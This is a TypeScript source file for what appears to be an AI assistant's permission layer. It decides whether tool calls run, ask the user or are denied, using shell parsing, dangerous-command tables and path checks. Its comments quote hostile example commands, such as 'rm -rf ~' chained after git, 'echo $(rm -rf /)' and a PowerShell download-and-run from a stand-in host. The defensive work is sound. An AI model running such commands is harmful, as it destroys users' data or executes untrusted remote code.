/**
 * One permission and risk layer, for Chat and for Cowork.
 *
 * WHAT THIS REPLACED, AND WHY IT HAD TO GO
 * ----------------------------------------
 * Cowork's `approvalPolicy` read, in full:
 *
 *     if (ALWAYS_ASK.has(toolName)) return "ask";
 *     void risk; void mode;
 *     return "auto";
 *
 * It took a risk band and a mode and discarded both. Every tool on the machine
 * — deleting files, typing into windows, running shell commands — ran without a
 * question, and one hard-coded name was the entire safety model. Chat had no
 * permission layer at all, because Chat had no tools; the moment Chat gets
 * tools, "no layer" stops being a description and becomes a hole.
 *
 * The imported primary logic carries a real one: permission modes, rules with
 * exact / prefix / wildcard matching, a dangerous-pattern table, destructive-
 * command warnings, and denial tracking. This module is the adapter between
 * that engine and OCADE's tool registry. The rules, the matching and the
 * pattern tables are the donor's; what is OCADE's is the mapping from a tool
 * call to the string those rules match against, and the surface rules below.
 *
 * THE ONE THING THIS LAYER WILL NOT DO
 * ------------------------------------
 * It never returns `allow` for a call it could not read. An argument shape it
 * does not recognise on a mutating tool resolves to `ask`, not to `allow`,
 * because "I could not tell what this would do" is a reason to check, never a
 * reason to proceed. Silence is not consent, including the compiler's.
 */

import {
  matchWildcardPattern,
  parsePermissionRule,
  type ShellPermissionRule,
} from "@/primary-logic/permissions/shellRuleMatching";
import { containsPathTraversal, dangerousPath } from "@/primary-logic/permissions/pathSafety";
import { permissionRuleValueFromString } from "@/primary-logic/permissions/permissionRuleParser";
import {
  DANGEROUS_BASH_PATTERNS,
  CROSS_PLATFORM_CODE_EXEC,
} from "@/primary-logic/permissions/dangerousPatterns";
import { getDestructiveCommandWarning } from "@/primary-logic/commands/destructiveCommandWarning";
import { getDestructiveCommandWarning as getPowerShellWarning } from "@/primary-logic/commands/powershellDestructiveWarning";
import { getParserModule } from "@/primary-logic/commands/bashParser";
import { analyzeCommand } from "@/primary-logic/commands/treeSitterAnalysis";
import { invokesPowerShellCodeExecution } from "@/primary-logic/commands/powershellCodeExecution";
import {
  createDenialTrackingState,
  recordDenial,
  recordSuccess,
  shouldFallbackToPrompting,
  type DenialTrackingState,
} from "@/primary-logic/permissions/denialTracking";
import type { PermissionBehavior } from "@/primary-logic/permissions/types";
import type { ToolDefinition } from "@/lib/agent/tool-registry";

/**
 * How much OCADE may do without asking.
 *
 * These are the donor's modes, named for what a person would say rather than
 * for an internal state. The donor also carried `bypassPermissions`, which
 * disables the layer wholesale. OCADE does not offer it: a switch whose only
 * effect is "stop checking" is a switch that exists to be regretted, and the
 * cases it was for are covered by `trusted` plus explicit allow rules.
 */
export type PermissionMode =
  /** Ask before anything that changes the machine. The default. */
  | "guarded"
  /** Edits to files and documents go through; the rest still asks. */
  | "acceptEdits"
  /** Anything not explicitly denied goes through. Still honours deny rules. */
  | "trusted"
  /** Nothing runs. Used while a plan is being reviewed. */
  | "plan";

export const PERMISSION_MODES: readonly PermissionMode[] = [
  "guarded",
  "acceptEdits",
  "trusted",
  "plan",
];

export interface ToolCallLike {
  name: string;
  arguments: Record<string, unknown>;
}

/**
 * A rule as the user wrote it, in the donor's `Tool(content)` syntax.
 *
 * Examples: `Bash(git status)`, `Bash(npm run:*)`, `file_write(~/Documents/*)`,
 * `screen_observe`. Content matching supports exact, `prefix:*` and `*`
 * wildcards, all from the imported matcher.
 */
export interface StoredRule {
  rule: string;
  behavior: PermissionBehavior;
}

export interface PermissionContext {
  mode: PermissionMode;
  rules: readonly StoredRule[];
  denials: DenialTrackingState;
  /**
   * The paired computer's home directory, when something knows it.
   *
   * Nothing supplies it today: the browser is deciding about a machine it
   * cannot inspect, and no layer between here and the companion reports the
   * path. It is accepted anyway so that a caller which does learn it can pass
   * it without another change here.
   *
   * Absent costs almost nothing. `~` is recognised as the home folder by its
   * literal form, and every other rule — filesystem roots, whole drives,
   * system folders at the top of a disk, traversal — is a fact about the
   * string. The only case this leaves is an ABSOLUTE path that happens to be
   * the home directory, written out in full.
   */
  home?: string | null;
}

export type PermissionOutcome = "allow" | "ask" | "deny";

export interface PermissionDecision {
  outcome: PermissionOutcome;
  /**
   * Why, in a sentence a person can act on. Shown verbatim in the approval
   * card and in the activity log, so it never names an internal mode or rule
   * source the user has not seen.
   */
  reason: string;
  /** A destructive-command note, when the imported table recognises one. */
  warning: string | null;
  /** The rule that decided it, when a rule did. Lets the UI say which. */
  matchedRule: string | null;
}

export function createPermissionContext(
  mode: PermissionMode = "guarded",
  rules: readonly StoredRule[] = [],
  home: string | null = null,
): PermissionContext {
  return { mode, rules, denials: createDenialTrackingState(), home };
}

/** Record that the user refused a call; repeated refusals re-enable prompting. */
export function noteDenied(context: PermissionContext): PermissionContext {
  return { ...context, denials: recordDenial(context.denials) };
}

/** Record that a call was approved and completed. */
export function noteApproved(context: PermissionContext): PermissionContext {
  return { ...context, denials: recordSuccess(context.denials) };
}

/**
 * The string a rule's content is matched against for a given call.
 *
 * For a shell tool it is the command itself, because that is what the user
 * means when they write `Bash(git status)`. For everything else it is the
 * primary subject of the call — the path, the URL, the application name —
 * since a rule about `file_delete` is almost always a rule about *which files*.
 *
 * Returning null means "this call has no stable subject", and a null subject
 * can only ever match a tool-wide rule. It never matches a content rule by
 * accident, which is the failure mode that would quietly widen an allow-list.
 */
export function subjectOf(call: ToolCallLike): string | null {
  const args = call.arguments ?? {};
  for (const key of [
    "command",
    "script",
    "path",
    "file",
    "filePath",
    "url",
    "name",
    "app",
    "query",
  ]) {
    const value = args[key];
    if (typeof value === "string" && value.trim()) return value.trim();
  }
  return null;
}

/** True when the call carries something that will be executed as a command. */
function commandOf(call: ToolCallLike): string | null {
  const args = call.arguments ?? {};
  for (const key of ["command", "script", "shell"]) {
    const value = args[key];
    if (typeof value === "string" && value.trim()) return value.trim();
  }
  return null;
}

/**
 * Every path this call would act on.
 *
 * The names are the ones the file and folder tools actually use. A tool that
 * grows a new path argument and is not listed here is not silently exempt: it
 * is simply not yet checked, which is why the test file asserts this list
 * against the registry rather than trusting it.
 */
export const PATH_ARGUMENT_KEYS = [
  "path",
  "paths",
  "folder",
  "directory",
  "source",
  "destination",
  "target",
  "file",
  /*
   * Leaf names, not paths — and included anyway.
   *
   * `folder_create({ folder: "downloads", name: "../../etc" })` is a path
   * argument wearing a name's clothes: the far end joins the two, and the
   * traversal check below is the only thing that notices. An application or
   * contact name trips neither rule, so covering these costs nothing.
   */
  "name",
  "item",
] as const;

function pathsOf(call: ToolCallLike): string[] {
  const args = call.arguments ?? {};
  const found: string[] = [];
  for (const key of PATH_ARGUMENT_KEYS) {
    const value = args[key];
    if (typeof value === "string" && value.trim()) found.push(value.trim());
    else if (Array.isArray(value)) {
      for (const item of value) {
        if (typeof item === "string" && item.trim()) found.push(item.trim());
      }
    }
  }
  return found;
}

/**
 * The path objection for this call, if there is one.
 *
 * Only for tools that CHANGE something. Reading `/etc` is how a person finds
 * out what is on their machine; emptying it is not, and a rule that refused
 * both would be turned off within a day.
 */
function pathObjectionFor(
  call: ToolCallLike,
  tool: ToolDefinition | null,
  home: string | null,
): string | null {
  if (!tool?.mutating) return null;
  for (const path of pathsOf(call)) {
    if (containsPathTraversal(path)) {
      return "that path climbs out of the folder it starts in";
    }
    const risk = dangerousPath(path, home);
    if (risk.dangerous) return risk.reason;
  }
  return null;
}

/**
 * A command, broken into the commands it actually runs.
 *
 * THE HOLE THIS CLOSES, WHICH WAS REAL AND NOT THEORETICAL.
 *
 * Rules were matched against the whole command string. A person who wrote the
 * entirely reasonable rule `Bash(git:*)` — "you may run git without asking me"
 * — had also, without knowing it, allowed:
 *
 *     git status; rm -rf ~
 *
 * because the prefix matcher only looks at the start. Every shell operator was
 * a way past every prefix rule in the product.
 *
 * The imported parser is a pure-TypeScript shell parser with a 50ms wall-clock
 * cap and a node budget, which is why it can run on a keystroke path in a
 * browser tab. Each segment is now matched on its own, and the strictest answer
 * across them governs.
 *
 * An unparseable command is asked about, never allowed. "I could not read this"
 * is a reason to check.
 */
interface CommandShape {
  segments: string[];
  /** True when the command hides work from rule matching: $(…), <(…), heredoc. */
  opaque: boolean;
  /** True when the parser could not read it at all. */
  unreadable: boolean;
}

export function shapeOf(command: string): CommandShape {
  const root = getParserModule()?.parse(command);
  if (!root) return { segments: [command], opaque: false, unreadable: true };
  try {
    const analysis = analyzeCommand(root, command);
    const segments = analysis.compoundStructure.segments
      .map((segment) => segment.trim())
      .filter(Boolean);
    const dangerous = analysis.dangerousPatterns;
    /*
     * WHETHER THE SEGMENTS ACTUALLY ACCOUNT FOR THE COMMAND.
     *
     * The parser is lenient by design — it does not refuse malformed input, it
     * returns what it could make of it. So `((((((((((` comes back as a single
     * segment `((`, and `a && (b` comes back as `a` and `(`, silently dropping
     * the subshell's contents. Rule matching against those segments would be
     * matching against something that is not the command.
     *
     * Comparing the characters recovered against the characters supplied is a
     * blunt check and a reliable one: operators and whitespace go missing
     * legitimately, whole commands do not. Below two thirds, OCADE has not read
     * it, and says so instead of guessing.
     */
    const supplied = command.replace(/\s/g, "").length;
    const recovered = segments.join("").replace(/\s/g, "").length;
    const coverage = supplied === 0 ? 1 : recovered / supplied;

    return {
      segments: segments.length > 0 ? segments : [command.trim()],
      /*
       * Command substitution is opaque on purpose. `echo $(rm -rf /)` matches
       * an `echo` rule and runs an `rm`; nothing a matcher does to the outer
       * string can see that, so the honest answer is to stop guessing and ask.
       */
      opaque:
        dangerous.hasCommandSubstitution ||
        dangerous.hasProcessSubstitution ||
        dangerous.hasHeredoc ||
        /*
         * AND THE SAME REASONING ACROSS THE SHELL BOUNDARY.
         *
         * The parser reads bash. Handed `powershell -c "iex (irm evil.test)"`
         * it sees one command called `powershell` and cannot look inside the
         * argument — so a rule saying `Bash(powershell:*)` covered a
         * download-and-run, exactly the hole command substitution opens in
         * bash. The imported cmdlet table recognises PowerShell's own ways of
         * executing something the text does not describe, and the answer is
         * the same as it is for `$(...)`: stop guessing and ask.
         */
        invokesPowerShellCodeExecution(command) !== null,
      unreadable: coverage < 0.66,
    };
  } catch {
    return { segments: [command], opaque: false, unreadable: true };
  }
}

function ruleMatches(parsed: ShellPermissionRule, subject: string): boolean {
  switch (parsed.type) {
    case "exact":
      return parsed.command === subject;
    case "prefix":
      return subject === parsed.prefix || subject.startsWith(`${parsed.prefix} `);
    case "wildcard":
      return matchWildcardPattern(parsed.pattern, subject);
  }
}

interface RuleHit {
  behavior: PermissionBehavior;
  rule: string;
}

/**
 * Whether a rule of this behaviour covers the call.
 *
 * For an ALLOW rule, "covers" means every segment of the command is matched —
 * one unmatched segment is an unallowed command, however many of its siblings
 * were fine. For DENY and ASK it is the opposite: one matching segment is
 * enough, because the strictest answer across a compound command governs.
 */
function findRule(
  call: ToolCallLike,
  rules: readonly StoredRule[],
  behavior: PermissionBehavior,
): RuleHit | null {
  const subject = subjectOf(call);
  const command = commandOf(call);
  const segments = command ? shapeOf(command).segments : null;

  for (const entry of rules) {
    if (entry.behavior !== behavior) continue;
    const value = permissionRuleValueFromString(entry.rule);
    if (value.toolName !== call.name) continue;
    // A rule with no content is tool-wide and matches every call to that tool.
    if (!value.ruleContent) return { behavior, rule: entry.rule };
    const parsed = parsePermissionRule(value.ruleContent);

    if (segments) {
      const matched =
        behavior === "allow"
          ? segments.every((segment) => ruleMatches(parsed, segment))
          : segments.some((segment) => ruleMatches(parsed, segment));
      if (matched) return { behavior, rule: entry.rule };
      continue;
    }

    if (subject === null) continue;
    if (ruleMatches(parsed, subject)) return { behavior, rule: entry.rule };
  }
  return null;
}

/**
 * Whether a command looks like one of the shapes the imported table flags.
 *
 * The patterns are the donor's and they are string sources, not compiled
 * expressions, so they are compiled once here and cached for the process.
 */
const DANGEROUS = [...DANGEROUS_BASH_PATTERNS, ...CROSS_PLATFORM_CODE_EXEC].map(
  (source) => new RegExp(source),
);

function looksDangerous(command: string): boolean {
  return DANGEROUS.some((pattern) => pattern.test(command));
}

/**
 * The destructive-command note for a command, on either shell.
 *
 * BOTH TABLES ARE ASKED, ALWAYS, AND THAT IS DELIBERATE.
 *
 * OCADE's companion runs on Windows as well as on macOS and Linux, and the
 * shell a command is meant for is not reliably knowable from the string:
 * `Remove-Item -Recurse -Force` is a PowerShell command and arrives through
 * exactly the same tool call as `rm -rf`. Choosing a table by guessing the
 * platform would mean guessing wrong sometimes, and guessing wrong here means
 * a warning that does not appear.
 *
 * Running both costs two regex passes and cannot produce a false alarm the
 * other table would have avoided — `Remove-Item` is not valid bash and `rm -rf`
 * is not valid PowerShell, so a hit from either is a hit.
 *
 * Checked per segment as well as whole: `echo starting && git reset --hard`
 * carries no warning as one string under some patterns and plainly does as two.
 */
function destructiveWarningFor(command: string, shape: CommandShape | null): string | null {
  const candidates = [command, ...(shape?.segments ?? [])];
  for (const candidate of candidates) {
    const warning = getDestructiveCommandWarning(candidate) ?? getPowerShellWarning(candidate);
    if (warning) return warning;
  }
  return null;
}

/**
 * Decide what happens to one tool call.
 *
 * Order matters and is not arbitrary: deny beats everything, then plan mode
 * stops the world, then an explicit ask overrides an automatic allow, then
 * rules, then the read-only shortcut, then risk. A user who wrote a deny rule
 * has said something more specific than any mode, so no mode may override it.
 */
export function decide(
  call: ToolCallLike,
  tool: ToolDefinition | null,
  context: PermissionContext,
): PermissionDecision {
  const command = commandOf(call);
  const shape = command ? shapeOf(command) : null;
  /*
   * Checked per segment as well as whole. `echo hi; git reset --hard` carries
   * no warning as one string under some patterns and plainly does as two.
   */
  const warning = command ? destructiveWarningFor(command, shape) : null;
  /*
   * The path objection, computed alongside the command warning and for the
   * same reason: a change to somewhere irreplaceable has to be recognised
   * before any allow rule is consulted, because a rule was written about a
   * TOOL and not about the whole disk.
   */
  const pathObjection = pathObjectionFor(call, tool, context.home ?? null);

  const denied = findRule(call, context.rules, "deny");
  if (denied) {
    return {
      outcome: "deny",
      reason: "You have blocked this action.",
      warning,
      matchedRule: denied.rule,
    };
  }

  if (!tool) {
    return {
      outcome: "deny",
      reason: "OCADE does not have that action.",
      warning,
      matchedRule: null,
    };
  }

  if (context.mode === "plan") {
    if (!tool.mutating) {
      return { outcome: "allow", reason: "Looking only.", warning, matchedRule: null };
    }
    return {
      outcome: "deny",
      reason: "Nothing runs while you are reviewing the plan.",
      warning,
      matchedRule: null,
    };
  }

  /*
   * A command OCADE could not fully read is asked about before any ALLOW rule
   * is consulted, and that ordering is the whole point.
   *
   * `echo $(rm -rf /)` matches an `echo` allow-rule perfectly, and the rule is
   * matching a string that does not describe what will run. An allow rule
   * cannot cover work nobody can see, so the unreadable case has to win over
   * it. Deny and plan mode still come first, because both are stricter.
   */
  if (shape && (shape.opaque || shape.unreadable)) {
    return {
      outcome: "ask",
      reason: shape.unreadable
        ? "OCADE could not read this command well enough to check it."
        : "This command runs another command inside it, so OCADE is checking with you.",
      warning,
      matchedRule: null,
    };
  }

  /*
   * A CHANGE TO SOMEWHERE IRREPLACEABLE IS ALWAYS ASKED ABOUT.
   *
   * Placed here, above the allow rules, for exactly the reason the unreadable
   * gate is: `Folder(empty)` is a rule about a TOOL, and the user who wrote it
   * was thinking of a downloads folder, not of their home directory. The
   * companion checks its own approved folders at the far end, and it is right
   * to — but that is one check, in another process, after the request has
   * already been sent. This is the one that happens before it leaves.
   *
   * Imported from the archive's path-validation rules, which is where the list
   * of what counts as irreplaceable comes from.
   */
  if (pathObjection) {
    return {
      outcome: "ask",
      reason: `OCADE is checking first: ${pathObjection}.`,
      warning,
      matchedRule: null,
    };
  }

  const asked = findRule(call, context.rules, "ask");
  if (asked) {
    return {
      outcome: "ask",
      reason: "You asked to be checked with on this.",
      warning,
      matchedRule: asked.rule,
    };
  }

  const allowed = findRule(call, context.rules, "allow");
  if (allowed) {
    return {
      outcome: "allow",
      reason: "You allowed this before.",
      warning,
      matchedRule: allowed.rule,
    };
  }

  /*
   * Reading is free. This is the line that makes observe-act-observe possible:
   * a loop that had to ask before every look would teach the user to approve
   * without reading, which costs more safety than it buys.
   */
  if (!tool.mutating) {
    return { outcome: "allow", reason: "Looking only.", warning, matchedRule: null };
  }

  /*
   * Two independent signals, and both must ask.
   *
   * `looksDangerous` is the donor's pattern table — the shapes that destroy
   * data or execute fetched code. `warning` is its destructive-command table,
   * which knows narrower things: `git reset --hard` matches no dangerous
   * pattern, and it still throws away work the user cannot get back. Consulting
   * only the first table let `git reset --hard` run silently under `trusted`,
   * which is precisely the loss the tables exist to prevent.
   */
  if (command && (looksDangerous(command) || shape?.segments.some(looksDangerous) || warning)) {
    return {
      outcome: "ask",
      reason: warning ?? "This command can do damage that cannot be undone.",
      warning,
      matchedRule: null,
    };
  }

  /*
   * A high-risk action asks in every mode short of an explicit rule. `trusted`
   * means "I do not want to be asked about routine things"; nobody means it to
   * include the irreversible ones, and a mode is too blunt an instrument to
   * carry that consent.
   */
  if (tool.risk === "high") {
    return {
      outcome: "ask",
      reason: warning ?? "This cannot be undone.",
      warning,
      matchedRule: null,
    };
  }

  /*
   * Repeated refusals mean the automatic answer is wrong for this person right
   * now. The donor's tracker exists for exactly this, and honouring it is what
   * keeps a permissive mode from becoming an argument the user cannot win.
   */
  if (shouldFallbackToPrompting(context.denials)) {
    return {
      outcome: "ask",
      reason: "You have turned several of these down, so OCADE is checking again.",
      warning,
      matchedRule: null,
    };
  }

  if (context.mode === "trusted") {
    return {
      outcome: "allow",
      reason: "Running without asking, as you set.",
      warning,
      matchedRule: null,
    };
  }

  if (context.mode === "acceptEdits" && (tool.domain === "files" || tool.domain === "content")) {
    return {
      outcome:
        tool.risk === "read" || tool.risk === "low" || tool.risk === "medium" ? "allow" : "ask",
      reason: "Edits go through without asking, as you set.",
      warning,
      matchedRule: null,
    };
  }

  return {
    outcome: "ask",
    reason: warning ?? "This changes something on your device.",
    warning,
    matchedRule: null,
  };
}

/**
 * The rule OCADE would write if the user picks "always allow" on this call.
 *
 * Scoped to the subject rather than the tool wherever there is one: agreeing to
 * `git status` is not agreeing to every shell command, and an approval dialog
 * that quietly means the latter is a dialog that lied.
 */
export function alwaysAllowRule(call: ToolCallLike): string {
  const subject = subjectOf(call);
  return subject ? `${call.name}(${subject.replace(/([()])/g, "\\$1")})` : call.name;
}
